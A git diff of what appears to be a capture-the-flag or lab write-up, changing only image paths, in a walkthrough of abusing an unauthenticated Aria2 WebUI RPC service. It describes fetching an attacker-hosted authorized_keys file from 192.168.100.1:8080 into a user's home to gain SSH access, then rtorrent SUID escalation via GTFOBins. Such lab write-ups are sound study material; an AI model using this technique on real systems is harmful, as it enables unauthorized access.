@@ -72,7 +72,7 @@ The presence of Aria2 WebUI on port 80 and its corresponding JSON-RPC service on
 
 Navigating to http://192.168.100.58 revealed the Aria2 WebUI interface:
 
-![aria2webui](image-1.png)
+![aria2webui](images/img.png)
 
 The interface displays a functional download manager with various filters (Running, Active, Waiting, Complete, Error, Paused, Removed) and **Quick Access Settings** visible in the left sidebar. Critically, the Quick Access Settings revealed:
 - **dir**: `/home/carolina` - indicating the default download directory belongs to a user named "carolina"
@@ -86,7 +86,7 @@ This information confirmed that the Aria2 service was running as user 'carolina'
 
 Clicking on **Settings > Connection Settings** revealed the RPC configuration:
 
-![connection settings](image-2.png)
+![connection settings](images/img-1.png)
 
 The Connection Settings dialog showed:
 - **Enter the host**: http:// 192.168.100.58
@@ -99,7 +99,7 @@ The Connection Settings dialog showed:
 
 After clicking "Save Connection configuration", the interface displayed a critical security message:
 
-![status connection](image-3.png)
+![status connection](images/img-2.png)
 
 The notification stated: "*Successfully connected to Aria2 through remote RPC, however the connection is still insecure. For complete security try adding an authorization secret token while starting Aria2 (through the flag --rpc-secret)*"
 
@@ -161,7 +161,7 @@ This server allowed the target machine to download the authorized_keys file via 
 
 In the Aria2 WebUI, the **Add** menu was accessed and **by URIs** was selected:
 
-![add downloads by uris](image-5.png)
+![add downloads by uris](images/img-4.png)
 
 The "Add Downloads By URIs" dialog was configured as follows:
 - **URI**: `http://192.168.100.1:8080/authorized_keys` (attacker's IP and HTTP server)
@@ -173,7 +173,7 @@ After clicking **Start**, Aria2 began downloading the file to the specified dire
 
 The download completed successfully:
 
-![download succes](image-6.png)
+![download succes](images/img-5.png)
 
 The interface showed:
 - **File**: authorized_keys
@@ -302,7 +302,7 @@ The key detail here is the mention of configuration options being loaded from th
 
 Consulting GTFOBins (a curated list of Unix binaries that can be exploited for privilege escalation), the rtorrent entry revealed a privilege escalation method:
 
-![alt text](image-7.png)
+![alt text](images/img-6.png)
 
 The GTFOBins page for rtorrent (with 12,569 stars on GitHub) shows a **Shell** exploitation technique under the **SUID** category. The explanation states:
 
